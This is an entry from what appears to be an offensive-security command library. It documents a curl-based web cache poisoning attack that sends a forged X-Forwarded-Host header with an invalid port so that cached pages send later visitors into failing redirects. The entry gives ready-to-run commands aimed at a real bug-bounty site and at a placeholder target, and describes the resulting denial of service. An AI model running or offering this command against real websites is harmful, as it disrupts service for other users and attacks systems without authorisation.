---
data: >-
  curl -H 'X-Forwarded-Host: www.hackerone.com:123'
  https://www.hackerone.com/index.php?dontpoisoneveryone=1
tags:
  - cache-poisoning
  - dos
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c9129176-ed4f-438f-ac12-1d1880767ded
created_at: '2025-12-14T17:26:56.738Z'
updated_at: '2025-12-14T17:26:56.738Z'
verified: false
validated: true
submitted: true
---
# curl-poison-x-forwarded-host

## Command

```bash
curl -H 'X-Forwarded-Host: www.hackerone.com:123' https://www.hackerone.com/index.php?dontpoisoneveryone=1
```

## Description

This command poisons the cache using X-Forwarded-Host with an invalid port, creating a unique key that leads to DoS via failed redirects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Adds X-Forwarded-Host header with invalid port (www.hackerone.com:123) | Yes |
| URL | Target URL for the request | Yes |

## Examples

### Basic Usage

```bash
curl -H 'X-Forwarded-Host: www.hackerone.com:123' https://www.hackerone.com/index.php?dontpoisoneveryone=1
```

### Advanced Usage

```bash
curl -H 'X-Forwarded-Host: example.com:999' -v https://target.com/page
```

## Expected Output

Successful HTTP response that gets cached; poisoned for future hits, leading to connection errors.

## Related

- [[commands/curl-poison-x-forwarded-port]]
- [[procedures/Poison-Cache-with-X-Forwarded-Host]]
